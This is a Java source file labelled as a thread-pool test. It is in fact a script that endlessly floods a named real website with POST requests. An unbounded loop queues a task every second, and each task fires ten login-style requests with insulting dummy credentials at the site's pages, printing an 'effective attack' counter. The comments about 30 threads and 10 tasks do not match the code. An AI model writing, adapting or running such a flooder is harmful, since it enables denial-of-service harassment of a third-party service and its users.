package com.gome.clover.thread;

import com.gome.clover.common.tools.HttpRequest;

/**
 * ━━━━━━神兽出没━━━━━━
 * 　　　┏┓　　　┏┓
 * 　　┏┛┻━━━┛┻┓
 * 　　┃　　　　　　　┃
 * 　　┃　　　━　　　┃
 * 　　┃　┳┛　┗┳　┃
 * 　　┃　　　　　　　┃
 * 　　┃　　　┻　　　┃
 * 　　┃　　　　　　　┃
 * 　　┗━┓　　　┏━┛
 * 　　　　┃　　　┃神兽保佑, 永无BUG!
 * 　　　　┃　　　┃Code is far away from bug with the animal protecting
 * 　　　　┃　　　┗━━━┓
 * 　　　　┃　　　　　　　┣┓
 * 　　　　┃　　　　　　　┏┛
 * 　　　　┗┓┓┏━┳┓┏┛
 * 　　　　　┃┫┫　┃┫┫
 * 　　　　　┗┻┛　┗┻┛
 * ━━━━━━感觉萌萌哒━━━━━━
 * Module Desc:clover
 * User: wangyue-ds6 || stark_summer@qq.com
 * Date: 2014/11/25
 * Time: 22:53
 */
public class ThreadPoolTest {
    public static void main(String[] args) throws InterruptedException {
        ThreadPool threadPool = new ThreadPool(9); //创建一个有个30工作线程的线程池
        //Thread.sleep(500); //休眠500毫秒,以便让线程池中的工作线程全部运行
        //运行任务
        for (int i = 0; i <i+1 ; i++) { //创建10个任务
            Thread.sleep(1000);
            threadPool.execute(createTask(i));
        }
        threadPool.waitFinish(); //等待所有任务执行完毕
        threadPool.closePool(); //关闭线程池

    }

    private static Runnable createTask(final int taskID) {
        return new Runnable() {
            public void run() {
                //  System.out.println("Task" + taskID + "开始");
                System.out.println("有效攻击任务ID:"+taskID);
                HttpRequest.sendPost("http://fansunion.cn/auth/dologin", "username=sb&password=sb");
                HttpRequest.sendPost("http://fansunion.cn/","username=sb&password=sb");
                HttpRequest.sendPost("http://fansunion.cn/service","username=sb&password=sb");
                HttpRequest.sendPost("http://fansunion.cn/case","username=sb&password=sb");
                HttpRequest.sendPost("http://fansunion.cn/code","username=sb&password=sb");
                HttpRequest.sendPost("http://fansunion.cn/ask","username=sb&password=sb");
                HttpRequest.sendPost("http://fansunion.cn/article","username=sb&password=sb");
                HttpRequest.sendPost("http://fansunion.cn/news","username=sb&password=sb");
                HttpRequest.sendPost("http://fansunion.cn/help","username=sb&password=sb");
                HttpRequest.sendPost("http://fansunion.cn/about","username=sb&password=sb");
                //  System.out.println("Task" + taskID + "结束");
            }
        };

    }
}
